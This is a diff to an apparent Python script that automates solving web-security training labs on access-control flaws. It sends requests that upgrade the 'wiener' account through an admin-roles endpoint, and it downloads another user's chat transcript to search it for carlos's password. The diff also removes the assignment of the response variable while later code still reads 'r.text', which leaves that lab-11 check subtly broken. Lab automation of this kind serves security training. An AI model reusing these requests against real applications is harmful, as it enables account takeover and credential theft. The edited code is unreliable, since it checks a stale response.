@@ -615,7 +615,7 @@ def access_control_vulnerabilities_labs():
         if log_out_text in r.text:
             loading_effect("upgrading wiener's account...", 1)
             upgrade_wiener_url = url + "/admin-roles?username=wiener&action=upgrade"
-            r = s.get(upgrade_wiener_url, verify=False, proxies=proxies)
+            s.get(upgrade_wiener_url, verify=False, proxies=proxies)
 
     if selected_lab == 7:
         loading_effect(getting_csrf_token_text, 1)
@@ -717,7 +717,7 @@ def access_control_vulnerabilities_labs():
     if selected_lab == 11:
         loading_effect("getting other conversations...", 1)
         chat_url = url + "/download-transcript/1.txt"
-        r = s.get(chat_url, verify=False, proxies=proxies)
+        s.get(chat_url, verify=False, proxies=proxies)
 
         if 'password' in r.text:
             loading_effect("searching for carlos's password...", 1)
